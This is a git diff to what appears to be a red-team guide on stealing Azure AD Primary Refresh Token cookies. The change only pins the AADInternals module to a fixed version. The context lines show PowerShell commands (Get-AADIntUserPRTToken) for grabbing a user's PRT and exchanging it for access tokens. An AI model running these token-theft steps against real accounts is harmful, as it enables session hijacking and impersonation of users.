@@ -65,7 +65,8 @@ Uri: https://login.microsoftonline.com/
 Use BrowserCore.exe to request a new PRT cookie with the current existing authentication context:
 
 ```powershell
-Import-Module AADInternals
+Import-Module AADInternals -RequiredVersion "0.9.4"
+
 # Get the PRToken
 Get-AADIntUserPRTToken
 ```
@@ -85,7 +86,7 @@ It's time to steal that user identity:
 # Next Step - Reconnaissance
 
 ```powershell
-Import-Module AADInternals
+Import-Module AADInternals -RequiredVersion "0.9.4"
 $prtToken = Get-AADIntUserPRTToken # get a new PRT Cookie if you used it already
 
 # using the new PRT Cookie, get an access token
